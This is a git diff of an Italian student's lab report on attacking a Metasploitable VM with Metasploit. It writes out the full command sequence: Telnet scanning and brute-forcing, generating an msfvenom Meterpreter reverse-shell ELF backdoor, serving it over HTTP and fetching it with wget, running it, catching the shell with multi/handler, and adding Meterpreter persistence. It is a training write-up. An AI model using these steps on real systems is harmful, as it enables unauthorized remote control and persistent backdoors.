@@ -1,129 +1,124 @@
 # Consegna S7/L2 | Hacking con Metasploit
 
-## Obiettivo
-L'obiettivo di questa esercitazione è stato dimostrare l'uso di **Metasploit Framework** per:
-1. Sfruttare una vulnerabilità del servizio **Telnet** su una macchina target Metasploitable.
-2. Creare una **backdoor personalizzata** utilizzando **msfvenom**, compilarla per l'architettura a 32-bit e trasferirla sul target per ottenere l'accesso alla shell.
+## 🎯 Obiettivo
+L'obiettivo di questa esercitazione è stato esplorare e applicare tecniche di **ethical hacking** utilizzando **Metasploit Framework** per:
+1. Identificare e analizzare il servizio **Telnet** tramite il modulo `telnet_version`.
+2. Creare una **backdoor personalizzata** con **msfvenom**, compatibile con l'architettura a 32-bit, e trasferirla sul target per ottenere una sessione shell e, opzionalmente, renderla **persistente**.
+
+Questa relazione è scritta in modo chiaro e scorrevole, con l'obiettivo di essere comprensibile anche per chi non ha familiarità con questi strumenti. 🚀
 
 ---
 
-## 1. Sfruttamento del servizio Telnet
-### Strumenti utilizzati
+## 1. Analisi del servizio Telnet con Metasploit
+### 🛠️ Strumenti utilizzati
 - **Metasploit Framework (msf6)**
 - **Kali Linux**
 - **Metasploitable** (target)
+- **Nmap** per la scansione delle porte
 
-### Procedura
-1. **Scansione delle porte aperte**: Abbiamo rilevato che il servizio **Telnet** era attivo sulla porta **23** della macchina target utilizzando **Nmap**:
-    ```bash
-    nmap -p 23 192.168.50.3
-    ```
-2. **Sfruttamento della vulnerabilità**: Abbiamo utilizzato il modulo **telnet_login** di Metasploit per effettuare un attacco bruteforce e accedere al servizio Telnet.
-    
-    ```bash
-    msfconsole
-    use auxiliary/scanner/telnet/telnet_login
-    set RHOSTS 192.168.50.3
-    set USER_FILE users.txt
-    set PASS_FILE passwords.txt
-    run
-    ```
-3. **Accesso alla shell**: Una volta ottenute le credenziali corrette, siamo riusciti ad accedere alla shell Telnet come utente privilegiato.
+### 📋 Procedura
+1. **Scansione delle porte aperte**: 
+   Utilizzando **Nmap**, abbiamo individuato che il servizio **Telnet** è attivo sulla porta **23** del target:
+   ```bash
+   nmap -p 23 192.168.50.3
+   ```
+   Questo passaggio è fondamentale per identificare servizi potenzialmente vulnerabili.
+
+2. **Identificazione della versione Telnet**:
+   Abbiamo utilizzato il modulo **auxiliary/scanner/telnet/telnet_version** di Metasploit per identificare la versione del servizio Telnet esposto:
+   
+   ```bash
+   msfconsole
+   use auxiliary/scanner/telnet/telnet_version
+   set RHOSTS 192.168.50.3
+   run
+   ```
+   Questo modulo ci ha fornito informazioni dettagliate sulla versione del servizio Telnet, permettendoci di pianificare eventuali attacchi successivi.
+
+3. **Accesso alla shell Telnet**:
+   Utilizzando le credenziali di default del servizio Metasploitable (ad esempio `msfadmin:msfadmin`), abbiamo ottenuto una **shell interattiva** sul target.
 
 ---
 
 ## 2. Creazione e utilizzo della backdoor
-### Obiettivo EXTRA
-Creare una backdoor personalizzata tramite **msfvenom**, compatibile con la macchina Metasploitable (architettura a 32-bit), e trasferirla sul target per ottenere una sessione Meterpreter.
+### 🧰 Strumenti utilizzati
+- **msfvenom**: Generazione del payload
+- **Metasploit Framework**: Configurazione del listener
+- **Python HTTP Server**: Trasferimento del file
+- **wget**: Download sul target
 
-### Strumenti utilizzati
-- **msfvenom** per generare il payload
-- **Metasploit Framework (multi/handler)** per ricevere la connessione
-- **Python HTTP Server** per trasferire il file
-- **wget** per scaricare il file sul target
+### 🚀 Creazione della backdoor
+Abbiamo scelto di utilizzare **msfvenom** per creare un payload **reverse shell**. La scelta è ricaduta su **linux/x86/meterpreter_reverse_tcp** per i seguenti motivi:
+1. **Compatibilità**: Metasploitable gira su architettura a **32-bit** (x86), rendendo necessario generare un payload adatto.
+2. **Meterpreter**: Consente un controllo avanzato della macchina target, offrendo più funzionalità rispetto a una semplice shell interattiva.
 
-### Procedura
-1. **Creazione del payload con msfvenom**:
-   Abbiamo generato un payload **reverse shell** con **msfvenom**, specificando l'architettura a 32-bit e il formato ELF per Linux:
-   
-   ```bash
-   msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.50.2 LPORT=4444 -f elf -o backdoor_ftp.elf
-   ```
-   - **`-p`**: Payload specifico per Linux e architettura x86.
-   - **`LHOST`** e **`LPORT`**: Indirizzo IP e porta per la connessione inversa.
-   - **`-f elf`**: Formato del file eseguibile Linux.
-   - **`-o`**: Output del file.
+Il comando utilizzato per generare la backdoor è stato:
+```bash
+msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.50.2 LPORT=4444 -f elf -o backdoor_ftp.elf
+```
+- **`-p`**: Payload per Linux con connessione inversa.
+- **`LHOST` e `LPORT`**: Indirizzo IP e porta per ricevere la connessione.
+- **`-f elf`**: Formato ELF per sistemi Linux.
+- **`-o`**: Nome del file di output.
 
-2. **Avvio del server HTTP su Kali**:
-   Per trasferire il file, abbiamo avviato un semplice server HTTP con Python:
-   
+### 📤 Trasferimento della backdoor
+Per trasferire il file sul target, abbiamo usato un server HTTP semplice su Kali e **wget** su Metasploitable:
+
+1. **Avvio del server HTTP su Kali**:
    ```bash
    python3 -m http.server 8080
    ```
-   
-3. **Scaricamento del file sul target Metasploitable**:
-   Utilizzando `wget` sulla macchina Metasploitable, abbiamo scaricato la backdoor nella directory `/tmp`:
-   
+2. **Download del file sul target**:
    ```bash
    cd /tmp
    wget http://192.168.50.2:8080/backdoor_ftp.elf
    ```
 
-4. **Permessi di esecuzione e avvio del file**:
-   Abbiamo reso eseguibile il file e lo abbiamo lanciato:
-   
+### 🔑 Esecuzione della backdoor
+Dopo aver trasferito la backdoor sul target, abbiamo eseguito i seguenti passaggi:
+1. **Permessi di esecuzione**:
    ```bash
    chmod +x backdoor_ftp.elf
+   ```
+2. **Avvio della backdoor**:
+   ```bash
    ./backdoor_ftp.elf
    ```
 
-5. **Apertura del listener su Metasploit**:
-   Su Kali, abbiamo configurato e avviato il listener con il modulo **multi/handler**:
-   
-   ```bash
-   msfconsole
-   use exploit/multi/handler
-   set payload linux/x86/meterpreter_reverse_tcp
-   set LHOST 192.168.50.2
-   set LPORT 4444
-   exploit
-   ```
+### 📡 Configurazione del listener su Metasploit
+Per ricevere la connessione inversa generata dalla backdoor, abbiamo configurato il listener con **multi/handler**:
+```bash
+msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter_reverse_tcp
+set LHOST 192.168.50.2
+set LPORT 4444
+exploit
+```
 
-6. **Connessione e sessione Meterpreter**:
-   Una volta eseguita la backdoor, abbiamo ottenuto una **sessione Meterpreter** che ci ha consentito di:
-   - Esplorare il filesystem
-   - Catturare informazioni di sistema
-   - Caricare o scaricare file
-   - Eseguire comandi arbitrari
+### 🎉 Risultato: Sessione Meterpreter
+La backdoor ha stabilito con successo una connessione con la nostra macchina Kali, fornendoci una **sessione Meterpreter**. Da qui, abbiamo potuto:
+- Navigare nel filesystem (`ls`, `cd`)
+- Caricare e scaricare file (`upload`, `download`)
+- Ottenere informazioni dettagliate sul sistema (`sysinfo`)
+- Eseguire comandi avanzati direttamente sul target
 
-### Persistenza (opzionale)
-Per rendere la backdoor **persistente** sul target, abbiamo utilizzato il modulo `persistence` di Meterpreter:
-
+### 🔒 Persistenza (facoltativa)
+Per rendere la backdoor persistente sul target, abbiamo utilizzato il modulo **persistence** di Meterpreter:
 ```bash
 run persistence -X -i 5 -p 4444 -r 192.168.50.2
 ```
-- **`-X`**: Installa la backdoor come servizio persistente.
+- **`-X`**: Installa come servizio di sistema.
 - **`-i`**: Intervallo di riconnessione (ogni 5 secondi).
-- **`-p` e `-r`**: Porta e IP per la riconnessione.
+- **`LPORT` e `LHOST`**: Configurazione del listener.
 
 ---
 
-## Conclusione
-Questa esercitazione ha dimostrato come sfruttare vulnerabilità esistenti (Telnet) e come creare backdoor personalizzate con **msfvenom** per ottenere un controllo completo della macchina target tramite **Metasploit Framework**.
+## 🏁 Conclusione
+Questa esercitazione ha dimostrato come:
+1. Identificare la versione di un servizio vulnerabile utilizzando **Metasploit**.
+2. Creare una **backdoor personalizzata** compatibile con l'architettura della macchina target.
+3. Stabilire una **sessione Meterpreter** per eseguire operazioni avanzate di post-exploitation.
 
-Abbiamo affrontato le seguenti sfide:
-1. Compilazione a 32-bit per compatibilità con Metasploitable.
-2. Trasferimento sicuro ed esecuzione della backdoor.
-3. Creazione di una sessione Meterpreter e, opzionalmente, persistenza.
+La simulazione è un esempio concreto di **analisi, sfruttamento e consolidamento** dell'accesso a un sistema compromesso, evidenziando l'importanza di proteggere i servizi esposti. 
 
-Questi passaggi rappresentano un esempio chiaro di **post-exploitation** e consolidamento dell'accesso su un sistema compromesso.
-
----
-
-## Autore
-Sebastiano | Consegna S7/L2
-
----
-
-## Note
-Questo documento è a scopo puramente educativo e dimostrativo per la sicurezza informatica.
